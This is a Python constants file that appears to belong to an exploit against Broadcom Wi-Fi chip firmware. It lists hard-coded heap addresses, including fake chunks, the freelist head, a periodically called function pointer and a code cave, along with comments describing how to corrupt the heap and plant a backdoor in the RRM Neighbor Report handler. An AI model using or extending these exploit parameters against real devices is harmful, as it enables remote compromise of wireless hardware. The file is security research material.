
#The location of the RRM Neighbor Report Response handler function into which we
#will introduce a backdoor
WLC_RRM_RECV_NEIGHBOR_REPORT_RESPONSE_INTERNAL = 0x00162676

#The address of the fake chunk preceding the disallowed ranges size DWORD. We force
#an allocation from this chunk in order to reduce the disallowed range (thus allowing
#subsequent "free"-s on addresses in the disallowed range)
FAKE_CHUNK_DISALLOWED_RANGE_OVERWRITE = 0x1FFFFC

#The address of the fake chunk precending the "wl hc" function pointer (which is periodically
#invoked). We force an allocation from this chunk in order to overwrite the function pointer 
#and direct it at our code cave.
FAKE_CHUNK_WL_HC = 0x207890

#The location of the periodically executed function pointer
WL_HC_PTR = FAKE_CHUNK_WL_HC + 0x20

#The original value of the function pointer for "wl hc"
WL_HC_ORIG_FUNC = 0x17FB55 

#The address of the chunk used to store our code cave contents
CODE_CAVE_CHUNK = 0x23FC14

#The offset from the code chunk's head at which our code is stashed
CODE_CAVE_CODE_OFFSET = 36

#An address of a "benign" chunk -- could be any address known to contain two consecutive 0x0 DWORDs
BENIGN_CHUNK = 0x206984

#The pointer to the head of the heap's freelist
FREELIST_HEAD_PTR = 0x1B84D4

#The location of the main freechunk
MAIN_FREECHUNK = 0x21078C
